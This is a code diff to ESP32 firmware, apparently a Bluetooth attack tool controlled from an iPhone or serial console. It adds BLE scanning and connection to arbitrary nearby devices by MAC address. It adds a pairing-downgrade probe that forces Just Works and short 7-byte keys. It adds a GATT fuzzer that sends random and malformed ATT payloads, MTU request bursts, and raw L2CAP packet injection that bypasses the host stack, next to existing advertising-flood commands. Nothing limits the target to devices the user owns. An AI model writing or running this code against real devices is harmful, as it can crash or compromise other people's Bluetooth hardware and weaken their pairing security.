@@ -1100,6 +1100,34 @@ static uint16_t bleConnIds[8];
 static uint32_t bleProbeSent = 0;
 static uint32_t bleProbeFail = 0;
 
+// stato Fase B.2/B.3 (usato dai callback, quindi dichiarato prima)
+static uint8_t bleRemBda[6] = {0};
+static bool bleRemBdaOk = false;
+static bool bleSmpDone = false;
+static uint8_t bleSmpMode = 0;
+static bool bleFuzzOn = false;
+static uint8_t bleFuzzType = 0;
+static uint32_t bleFuzzTicks = 0;
+static uint32_t bleFuzzLast = 0;
+static uint32_t bleFuzzOk = 0;
+static uint32_t bleFuzzFail = 0;
+static uint32_t bleRxOk = 0;
+static uint32_t bleRxErr = 0;
+static uint8_t bleFuzzBuf[512];
+
+// --- Fase B.6: scan BLE asincrono (esp_gap raw, non blocca il loop) ---
+#define BLE_SCAN_MAX 12
+struct BleScanHit { uint8_t bda[6]; uint8_t type; int8_t rssi; char name[24]; };
+static BleScanHit bleHits[BLE_SCAN_MAX];
+static uint8_t bleHitN = 0;
+static bool bleScanning = false;
+static uint16_t bleScanSecsLeft = 0;
+
+static int bleHitFind(const uint8_t *bda) {
+  for (int i = 0; i < bleHitN; i++) if (memcmp(bleHits[i].bda, bda, 6) == 0) return i;
+  return -1;
+}
+
 static void bleGattcCb(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_gattc_cb_param_t *param) {
   switch (event) {
     case ESP_GATTC_REG_EVT:
@@ -1110,9 +1138,24 @@ static void bleGattcCb(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_b
     case ESP_GATTC_OPEN_EVT:
       if (param->open.status == ESP_GATT_OK && bleConnCount < 8) {
         bleConnIds[bleConnCount++] = param->open.conn_id;
+        memcpy(bleRemBda, param->open.remote_bda, 6);
+        bleRemBdaOk = true;
       }
       Serial.printf("[ble] open status=%d conn_id=%d n=%d\n",
                     param->open.status, param->open.conn_id, bleConnCount);
+      break;
+    case ESP_GATTC_READ_CHAR_EVT:
+      if (param->read.status == ESP_GATT_OK) bleRxOk++; else bleRxErr++;
+      break;
+    case ESP_GATTC_WRITE_CHAR_EVT:
+      if (param->write.status == ESP_GATT_OK) bleRxOk++; else bleRxErr++;
+      break;
+    case ESP_GATTC_CFG_MTU_EVT:
+      Serial.printf("[ble] mtu=%d conn_id=%d\n", param->cfg_mtu.mtu, param->cfg_mtu.conn_id);
+      break;
+    case ESP_GATTC_SEARCH_CMPL_EVT:
+      Serial.printf("[ble] search cmpl status=%d count=%d\n",
+                    param->search_cmpl.status, param->search_cmpl.searched_service_source);
       break;
     case ESP_GATTC_DISCONNECT_EVT:
       Serial.printf("[ble] disc conn_id=%d reason=0x%02X\n",
@@ -1163,6 +1206,56 @@ static void bleFloodStop() {
   Serial.printf("[ble] adv flood stop ticks=%lu\n", (unsigned long)bleFloodTicks);
 }
 
+// --- Fase B.5: GAP callback per l'esito reale di pairing/SMP ---
+static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
+  if (event == ESP_GAP_BLE_AUTH_CMPL_EVT) {
+    bleSmpDone = true;
+    Serial.printf("[ble] auth cmpl ok=%d fail=0x%02X key_present=%d auth_mode=%d\n",
+                  (int)param->ble_security.auth_cmpl.success,
+                  (int)param->ble_security.auth_cmpl.fail_reason,
+                  (int)param->ble_security.auth_cmpl.key_present,
+                  (int)param->ble_security.auth_cmpl.auth_mode);
+  } else if (event == ESP_GAP_BLE_KEY_EVT) {
+    Serial.printf("[ble] key type=%d\n", (int)param->ble_security.ble_key.key_type);
+  } else if (event == ESP_GAP_BLE_SCAN_PARAM_SET_COMPLETE_EVT) {
+    if (bleScanning) esp_ble_gap_start_scanning(bleScanSecsLeft);
+  } else if (event == ESP_GAP_BLE_SCAN_RESULT_EVT) {
+    if (param->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT) {
+      const uint8_t *bda = param->scan_rst.bda;
+      int idx = bleHitFind(bda);
+      if (idx < 0 && bleHitN < BLE_SCAN_MAX) {
+        idx = bleHitN++;
+        memcpy(bleHits[idx].bda, bda, 6);
+        bleHits[idx].name[0] = 0;
+      }
+      if (idx >= 0) {
+        bleHits[idx].type = (uint8_t)param->scan_rst.ble_addr_type;
+        bleHits[idx].rssi = (int8_t)param->scan_rst.rssi;
+        if (!bleHits[idx].name[0]) {
+          uint8_t nlen = 0;
+          uint8_t *nm = esp_ble_resolve_adv_data(param->scan_rst.ble_adv, ESP_BLE_AD_TYPE_NAME_CMPL, &nlen);
+          if (!nm) nm = esp_ble_resolve_adv_data(param->scan_rst.ble_adv, ESP_BLE_AD_TYPE_NAME_SHORT, &nlen);
+          if (nm && nlen) {
+            if (nlen > 23) nlen = 23;
+            memcpy(bleHits[idx].name, nm, nlen);
+            bleHits[idx].name[nlen] = 0;
+          }
+        }
+      }
+    } else if (param->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_CMPL_EVT) {
+      bleScanning = false;
+      Serial.printf("[blescan] done n=%u\n", bleHitN);
+      for (int i = 0; i < bleHitN; i++)
+        Serial.printf("[blescan] %d %02X:%02X:%02X:%02X:%02X:%02X type=%u rssi=%d name=%s\n", i,
+                      bleHits[i].bda[0], bleHits[i].bda[1], bleHits[i].bda[2],
+                      bleHits[i].bda[3], bleHits[i].bda[4], bleHits[i].bda[5],
+                      bleHits[i].type, (int)bleHits[i].rssi, bleHits[i].name);
+    }
+  } else if (event == ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT) {
+    bleScanning = false;
+  }
+}
+
 static void bleFloodTick() {
   if (!bleFloodOn) return;
   if (millis() - bleFloodLast < 60) return;
@@ -1208,6 +1301,210 @@ static int bleAttProbe(uint8_t count) {
     delay(8);
   }
   return sent;
+}
+
+// --- Fase B.2: SMP downgrade probe (Just Works / Legacy vs SC) ---
+static int bleSmpStart(uint8_t mode) {
+  if (!bleRemBdaOk) return -1;
+  esp_ble_auth_req_t ar;
+  esp_ble_io_cap_t iocap;
+  switch (mode) {
+    case 1:
+      ar = (esp_ble_auth_req_t)(ESP_LE_AUTH_REQ_SC_ONLY | ESP_LE_AUTH_BOND);
+      iocap = ESP_IO_CAP_NONE;
+      break;
+    case 2:
+      ar = ESP_LE_AUTH_REQ_SC_MITM_BOND;
+      iocap = ESP_IO_CAP_OUT;
+      break;
+    case 3:
+      ar = (esp_ble_auth_req_t)(ESP_LE_AUTH_REQ_MITM | ESP_LE_AUTH_BOND);
+      iocap = ESP_IO_CAP_NONE;
+      break;
+    default:
+      ar = ESP_LE_AUTH_BOND;  // Just Works, no SC
+      iocap = ESP_IO_CAP_NONE;
+      break;
+  }
+  esp_ble_gap_set_security_param(ESP_BLE_SM_AUTHEN_REQ_MODE, &ar, 1);
+  esp_ble_gap_set_security_param(ESP_BLE_SM_IOCAP_MODE, &iocap, 1);
+  uint8_t keyDist = ESP_BLE_ENC_KEY_MASK | ESP_BLE_ID_KEY_MASK;
+  esp_ble_gap_set_security_param(ESP_BLE_SM_SET_INIT_KEY, &keyDist, 1);
+  esp_ble_gap_set_security_param(ESP_BLE_SM_SET_RSP_KEY, &keyDist, 1);
+  uint16_t ksz = 7;
+  esp_ble_gap_set_security_param(ESP_BLE_SM_MIN_KEY_SIZE, &ksz, sizeof(ksz));
+  ksz = 16;
+  esp_ble_gap_set_security_param(ESP_BLE_SM_MAX_KEY_SIZE, &ksz, sizeof(ksz));
+  bleSmpMode = mode;
+  bleSmpDone = false;
+  esp_err_t rc = esp_ble_set_encryption(bleRemBda, ESP_BLE_SEC_ENCRYPT);
+  Serial.printf("[ble] smp mode=%d rc=%d\n", mode, (int)rc);
+  return (int)rc;
+}
+
+// --- Fase B.3: ATT/GATT fuzz engine (host-level, opcode table) ---
+static bool bleFuzzStart(uint8_t type) {
+  if (!bleGattcReady || bleConnCount == 0) return false;
+  bleFuzzType = type;
+  bleFuzzOn = true;
+  bleFuzzLast = 0;
+  bleFuzzTicks = 0;
+  bleFuzzOk = 0;
+  bleFuzzFail = 0;
+  Serial.printf("[ble] fuzz on type=%d\n", type);
+  return true;
+}
+
+static void bleFuzzStop() {
+  if (!bleFuzzOn) return;
+  bleFuzzOn = false;
+  Serial.printf("[ble] fuzz stop ticks=%lu ok=%lu fail=%lu rx=%lu rxErr=%lu\n",
+                (unsigned long)bleFuzzTicks, (unsigned long)bleFuzzOk, (unsigned long)bleFuzzFail,
+                (unsigned long)bleRxOk, (unsigned long)bleRxErr);
+}
+
+static void bleFuzzTick() {
+  if (!bleFuzzOn) return;
+  if (bleConnCount == 0) { bleFuzzStop(); return; }
+  if (millis() - bleFuzzLast < 25) return;
+  bleFuzzLast = millis();
+  uint16_t cid = bleConnIds[bleConnCount - 1];
+  uint16_t h = (uint16_t)(1 + (esp_random() % 0xFFFE));
+  esp_err_t rc = ESP_FAIL;
+  switch (bleFuzzType) {
+    case 0:
+      rc = esp_ble_gattc_read_char(bleGattcIf, cid, h, ESP_GATT_AUTH_REQ_NONE);
+      break;
+    case 1: {
+      uint8_t n = (esp_random() & 1) ? 20 : 64;
+      for (int i = 0; i < n; i++) bleFuzzBuf[i] = (uint8_t)esp_random();
+      rc = esp_ble_gattc_write_char(bleGattcIf, cid, h, n, bleFuzzBuf,
+                                    (esp_random() & 1) ? ESP_GATT_WRITE_TYPE_NO_RSP : ESP_GATT_WRITE_TYPE_RSP,
+                                    ESP_GATT_AUTH_REQ_NONE);
+      break;
+    }
+    case 2:
+      rc = esp_ble_gattc_send_mtu_req(bleGattcIf, cid);
+      break;
+    case 3:
+      rc = esp_ble_gattc_search_service(bleGattcIf, cid, NULL);
+      break;
+    case 5: {  // payload table: ATT opcode-like malformed values
+      static const uint8_t tbl[][8] = {
+        {0x12, 0x01, 0x00, 0xFF, 0xFF},   // Write Request, handle 0x0001, 3B
+        {0x52, 0x03, 0x00, 0x00, 0x00},   // Write Cmd, 3B
+        {0x16, 0xFF, 0xFF},               // Prepare Write, handle 0xFFFF
+        {0x02, 0x00, 0x00},               // MTU req 0
+        {0x08, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},  // Read Blob
+        {0x10, 0x00, 0x00}                // Read By Group Type
+      };
+      int k = esp_random() % (int)(sizeof(tbl) / sizeof(tbl[0]));
+      int n = (int)sizeof(tbl[k]);
+      for (int i = 0; i < n; i++) bleFuzzBuf[i] = tbl[k][i];
+      rc = esp_ble_gattc_write_char(bleGattcIf, cid, h, (uint16_t)n, bleFuzzBuf,
+                                    ESP_GATT_WRITE_TYPE_RSP, ESP_GATT_AUTH_REQ_NONE);
+      break;
+    }
+    default: {
+      uint16_t n = (uint16_t)(23 + (esp_random() % 490));
+      for (int i = 0; i < (int)n && i < 512; i++) bleFuzzBuf[i] = (uint8_t)esp_random();
+      rc = esp_ble_gattc_write_char(bleGattcIf, cid, h, n, bleFuzzBuf,
+                                    ESP_GATT_WRITE_TYPE_RSP, ESP_GATT_AUTH_REQ_NONE);
+      break;
+    }
+  }
+  if (rc == ESP_OK) bleFuzzOk++; else bleFuzzFail++;
+  bleFuzzTicks++;
+}
+
+static void bleScanAsyncStart(uint16_t secs) {
+  if (bleScanning) return;
+  bleHitN = 0;
+  bleScanSecsLeft = secs ? secs : 4;
+  esp_ble_scan_params_t sp;
+  memset(&sp, 0, sizeof(sp));
+  sp.scan_type = BLE_SCAN_TYPE_ACTIVE;
+  sp.own_addr_type = BLE_ADDR_TYPE_PUBLIC;
+  sp.scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL;
+  sp.scan_interval = 0x50;
+  sp.scan_window = 0x30;
+  sp.scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE;
+  bleScanning = true;
+  esp_err_t rc = esp_ble_gap_set_scan_params(&sp);
+  Serial.printf("[blescan] start %us rc=%d\n", bleScanSecsLeft, (int)rc);
+}
+
+// --- Fase C: VHCI raw (bypass Bluedroid → controller) ---
+// Il controller gira in modalità VHCI (CONFIG_BTDM_CTRL_HCI_MODE_VHCI=y):
+// parliamo direttamente con lui. I simboli non sono nel header Arduino:
+extern "C" bool esp_vhci_host_check_send_available(void);
+extern "C" void esp_vhci_host_send_packet(uint8_t *data, uint16_t len);
+
+static bool vhciBusy = false;
+
+static bool vhciSend(const uint8_t *p, uint16_t n) {
+  int retry = 60;
+  while (!esp_vhci_host_check_send_available() && retry-- > 0) delay(2);
+  if (retry <= 0) return false;
+  esp_vhci_host_send_packet((uint8_t *)p, n);
+  return true;
+}
+
+// HCI ACL con L2CAP Connect Request (CID 0x0001 → PSM)
+static bool vhciL2capConnect(uint16_t handle, uint16_t psm) {
+  uint8_t pkt[16];
+  int len = 12;
+  pkt[0] = 0x02;                 // HCI ACL
+  pkt[1] = (uint8_t)(handle & 0xFF);
+  pkt[2] = (uint8_t)((handle >> 8) & 0x0F);
+  pkt[3] = (uint8_t)(len & 0xFF);  // ACL data len
+  pkt[4] = (uint8_t)((len >> 8) & 0xFF);
+  pkt[5] = (uint8_t)(len & 0xFF);  // L2CAP len = 12
+  pkt[6] = 0x00;
+  pkt[7] = 0x01; pkt[8] = 0x00;   // CID 0x0001 (signaling)
+  pkt[9] = 0x02;                  // L2CAP_CONN_REQ
+  pkt[10] = 0x01;                 // identifier
+  pkt[11] = 0x04; pkt[12] = 0x00; // length
+  pkt[13] = (uint8_t)(psm & 0xFF);
+  pkt[14] = (uint8_t)((psm >> 8) & 0xFF);
+  pkt[15] = 0x00;                 // source CID
+  return vhciSend(pkt, 16);
+}
+
+static void vhciProbe() {
+  bool av = esp_vhci_host_check_send_available();
+  Serial.printf("[vhci] available=%d\n", (int)av);
+}
+
+// HCI ACL con payload L2CAP arbitrario (CID + dati): SDP/BNEP/ATT raw
+static bool vhciL2capRaw(uint16_t handle, uint16_t cid, const uint8_t *payload, uint16_t plen) {
+  if (plen > 200) return false;
+  uint8_t pkt[220];
+  uint16_t l2len = (uint16_t)(4 + plen);
+  int o = 0;
+  pkt[o++] = 0x02;
+  pkt[o++] = (uint8_t)(handle & 0xFF);
+  pkt[o++] = (uint8_t)((handle >> 8) & 0x0F);
+  pkt[o++] = (uint8_t)((l2len + 4) & 0xFF);
+  pkt[o++] = (uint8_t)(((l2len + 4) >> 8) & 0xFF);
+  pkt[o++] = (uint8_t)(l2len & 0xFF);
+  pkt[o++] = (uint8_t)((l2len >> 8) & 0xFF);
+  pkt[o++] = (uint8_t)(cid & 0xFF);
+  pkt[o++] = (uint8_t)((cid >> 8) & 0xFF);
+  memcpy(pkt + o, payload, plen);
+  o += plen;
+  return vhciSend(pkt, (uint16_t)o);
+}
+
+static int bleMtuBurst(uint8_t count) {
+  if (!bleGattcReady || bleConnCount == 0) return -1;
+  uint16_t cid = bleConnIds[bleConnCount - 1];
+  int ok = 0;
+  for (int i = 0; i < count; i++) {
+    if (esp_ble_gattc_send_mtu_req(bleGattcIf, cid) == ESP_OK) ok++;
+    delay(20);
+  }
+  return ok;
 }
 
 // ============ dispatcher ============
@@ -1642,7 +1939,9 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
         break;
       }
       bool hop = plen > 0 ? pl[0] != 0 : true;
-      if (!capStart(hop)) { sendFrame(0x30, 0x03, (const uint8_t *)"busy", 4); break; }
+      if (plen > 1 && pl[1] >= 1 && pl[1] <= 14) { capForceCh = pl[1]; hop = false; }
+      else capForceCh = 0;
+      if (!capStart(hop)) { capForceCh = 0; sendFrame(0x30, 0x03, (const uint8_t *)"busy", 4); break; }
       sendFrame(0x30, 0x00, (const uint8_t *)"armed", 5);
       break;
     }
@@ -1722,7 +2021,96 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
 
     case 0x43: {  // storm stop
       bleFloodStop();
+      bleFuzzStop();
       sendFrame(0x43, 0x00, (const uint8_t *)"stopped", 7);
+      break;
+    }
+
+    case 0x44: {  // smp probe [mode]
+      int rc = bleSmpStart(plen > 0 ? pl[0] : 0);
+      uint8_t out[2] = {(uint8_t)(plen > 0 ? pl[0] : 0), (uint8_t)(rc < 0 ? 0xFF : rc)};
+      sendFrame(0x44, rc == 0 ? 0x00 : 0x02, out, 2);
+      break;
+    }
+
+    case 0x45: {  // att fuzz [type][on]
+      bool on = plen > 1 ? pl[1] != 0 : true;
+      if (on) {
+        bool ok = bleFuzzStart(plen > 0 ? pl[0] : 0);
+        sendFrame(0x45, ok ? 0x00 : 0x02, (const uint8_t *)(ok ? "fuzz on" : "no link"), ok ? 7 : 7);
+      } else {
+        bleFuzzStop();
+        sendFrame(0x45, 0x00, (const uint8_t *)"fuzz off", 8);
+      }
+      break;
+    }
+
+    case 0x46: {  // mtu burst [count]
+      int ok = bleMtuBurst(plen > 0 ? pl[0] : 8);
+      uint8_t out[2] = {(uint8_t)(ok < 0 ? 0 : ok), bleConnCount};
+      sendFrame(0x46, ok < 0 ? 0x02 : 0x00, out, 2);
+      break;
+    }
+
+    case 0x47: {  // fuzz stats
+      uint8_t out[10];
+      out[0] = (uint8_t)bleFuzzTicks; out[1] = (uint8_t)(bleFuzzTicks >> 8);
+      out[2] = (uint8_t)bleFuzzOk;    out[3] = (uint8_t)(bleFuzzOk >> 8);
+      out[4] = (uint8_t)bleFuzzFail;  out[5] = (uint8_t)(bleFuzzFail >> 8);
+      out[6] = (uint8_t)bleRxOk;      out[7] = (uint8_t)(bleRxOk >> 8);
+      out[8] = (uint8_t)bleRxErr;     out[9] = (uint8_t)(bleRxErr >> 8);
+      sendFrame(0x47, 0x00, out, 10);
+      break;
+    }
+
+    case 0x48: {  // ble scan start [secs]
+      bleScanAsyncStart(plen > 0 ? pl[0] : 5);
+      sendFrame(0x48, 0x00, (const uint8_t *)"scan start", 10);
+      break;
+    }
+
+    case 0x49: {  // ble scan list
+      uint8_t out[600];
+      int n = 0;
+      out[n++] = bleHitN;
+      for (int i = 0; i < bleHitN; i++) {
+        memcpy(out + n, bleHits[i].bda, 6); n += 6;
+        out[n++] = bleHits[i].type;
+        out[n++] = (uint8_t)bleHits[i].rssi;
+        uint8_t nl = (uint8_t)strlen(bleHits[i].name);
+        out[n++] = nl;
+        memcpy(out + n, bleHits[i].name, nl); n += nl;
+      }
+      sendFrame(0x49, bleScanning ? 0x01 : 0x00, out, n);
+      break;
+    }
+
+    case 0x50: {  // vhci l2cap connect [h lo][h hi][psm lo][psm hi][count]
+      if (plen < 5) { sendFrame(0x50, 0x02, (const uint8_t *)"bad args", 8); break; }
+      uint16_t h = (uint16_t)(pl[0] | (pl[1] << 8));
+      uint16_t psm = (uint16_t)(pl[2] | (pl[3] << 8));
+      uint8_t n = pl[4] ? pl[4] : 1;
+      int ok = 0;
+      for (uint8_t i = 0; i < n; i++) { if (vhciL2capConnect(h, psm)) ok++; delay(20); }
+      uint8_t out[3] = {(uint8_t)ok, (uint8_t)(h & 0xFF), (uint8_t)(h >> 8)};
+      sendFrame(0x50, ok ? 0x00 : 0x02, out, 3);
+      break;
+    }
+
+    case 0x51: {  // vhci probe
+      bool av = esp_vhci_host_check_send_available();
+      uint8_t out[1] = {(uint8_t)av};
+      sendFrame(0x51, 0x00, out, 1);
+      break;
+    }
+
+    case 0x52: {  // vhci l2cap raw [h lo][h hi][cid lo][cid hi][payload...]
+      if (plen < 5) { sendFrame(0x52, 0x02, (const uint8_t *)"bad args", 8); break; }
+      uint16_t h = (uint16_t)(pl[0] | (pl[1] << 8));
+      uint16_t cid = (uint16_t)(pl[2] | (pl[3] << 8));
+      bool ok = vhciL2capRaw(h, cid, pl + 4, (uint16_t)(plen - 4));
+      uint8_t out[2] = {(uint8_t)ok, (uint8_t)esp_vhci_host_check_send_available()};
+      sendFrame(0x52, ok ? 0x00 : 0x02, out, 2);
       break;
     }
 
@@ -1757,11 +2145,13 @@ static void feedRx(const uint8_t *d, int n) {
 
 // ============ setup ============
 void setup() {
+  Serial.setRxBufferSize(1024);
   Serial.begin(115200);
   delay(150);
 
   // BLE GATT (iPhone → ESP32)
   BLEDevice::init("RedHatBridge32");
+  esp_ble_gap_register_callback(bleGapCb);
   BLEDevice::setMTU(517);
   pServer = BLEDevice::createServer();
   pServer->setCallbacks(new SrvCb());
@@ -1837,6 +2227,7 @@ void loop() {
   btTick();
   capTick();
   bleFloodTick();
+  bleFuzzTick();
 
   // smoke test seriale: S=start hop, R=start fisso, Q=stop, X=stats, D=dump sessioni
   static String serCmd;
@@ -1880,6 +2271,83 @@ void loop() {
       else if (serCmd == "T") {
         int s = bleAttProbe(4);
         Serial.printf("[ble] probe sent=%d conns=%d\n", s, bleConnCount);
+      }
+      else if (serCmd.startsWith("W")) {
+        uint16_t secs = serCmd.length() > 1 ? (uint16_t)serCmd.substring(1).toInt() : 5;
+        bleScanAsyncStart(secs);
+      }
+      else if (serCmd.startsWith("M")) {
+        const char *cs = serCmd.c_str();
+        int idx = strlen(cs) > 1 ? (cs[1] - '0') : 0;
+        if (idx >= 0 && idx < bleHitN) {
+          int rc = bleConnect(bleHits[idx].bda, bleHits[idx].type);
+          Serial.printf("[ble] connect idx=%d mac=%02X:%02X:%02X:%02X:%02X:%02X type=%u rc=%d conns=%d\n",
+                        idx, bleHits[idx].bda[0], bleHits[idx].bda[1], bleHits[idx].bda[2],
+                        bleHits[idx].bda[3], bleHits[idx].bda[4], bleHits[idx].bda[5],
+                        bleHits[idx].type, rc, bleConnCount);
+        } else {
+          Serial.printf("[ble] connect idx=%d fuori range (n=%u)\n", idx, bleHitN);
+        }
+      }
+      else if (serCmd.startsWith("K")) {
+        const char *cs = serCmd.c_str();
+        int hl = (int)strlen(cs) - 1;  // caratteri dopo la K
+        auto nib = [](char c) -> int {
+          if (c >= '0' && c <= '9') return c - '0';
+          if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+          if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+          return -1;
+        };
+        if (hl >= 12) {
+          uint8_t m[6];
+          bool okHex = true;
+          for (int i = 0; i < 6; i++) {
+            int a = nib(cs[1 + i * 2]), b = nib(cs[2 + i * 2]);
+            if (a < 0 || b < 0) { okHex = false; break; }
+            m[i] = (uint8_t)(a * 16 + b);
+          }
+          uint8_t t = hl > 12 ? (uint8_t)(cs[13] - '0') : 1;
+          if (okHex) {
+            int rc = bleConnect(m, t);
+            Serial.printf("[ble] connect mac=%02X:%02X:%02X:%02X:%02X:%02X type=%u rc=%d conns=%d\n",
+                          m[0], m[1], m[2], m[3], m[4], m[5], t, rc, bleConnCount);
+          } else {
+            Serial.println("[ble] connect: hex non valido");
+          }
+        } else {
+          Serial.printf("[ble] connect: usa K<12hex>[type] (len=%d)\n", hl);
+        }
+      }
+      else if (serCmd.startsWith("P")) {
+        int rc = bleSmpStart(serCmd.length() > 1 ? (uint8_t)serCmd.substring(1).toInt() : 0);
+        Serial.printf("[ble] smp rc=%d remBda=%d\n", rc, (int)bleRemBdaOk);
+      }
+      else if (serCmd.startsWith("U")) {
+        uint8_t t = serCmd.length() > 1 ? (uint8_t)serCmd.substring(1).toInt() : 0;
+        bool ok = bleFuzzStart(t);
+        Serial.printf("[ble] fuzz=%d type=%u ok=%d\n", (int)bleFuzzOn, t, (int)ok);
+      }
+      else if (serCmd == "A") {
+        vhciProbe();
+      }
+      else if (serCmd == "!") {
+        uint8_t psmReq[2] = {0x01, 0x00};
+        bool ok = vhciL2capRaw(0x0000, 0x0001, psmReq, 2);
+        Serial.printf("[vhci] raw send=%d avail=%d\n", (int)ok, (int)esp_vhci_host_check_send_available());
+      }
+      else if (serCmd.startsWith("V")) {
+        int ok = bleMtuBurst(serCmd.length() > 1 ? (uint8_t)serCmd.substring(1).toInt() : 8);
+        Serial.printf("[ble] mtu burst ok=%d conns=%d\n", ok, bleConnCount);
+      }
+      else if (serCmd == "Y") {
+        bleFuzzStop();
+        Serial.printf("[ble] fuzz ticks=%lu ok=%lu fail=%lu rx=%lu rxErr=%lu\n",
+                      (unsigned long)bleFuzzTicks, (unsigned long)bleFuzzOk, (unsigned long)bleFuzzFail,
+                      (unsigned long)bleRxOk, (unsigned long)bleRxErr);
+      }
+      else if (serCmd == "Z") {
+        bleFuzzStop();
+        Serial.println("[ble] fuzz off");
       }
       else if (serCmd == "J") {
         WiFi.disconnect(false);
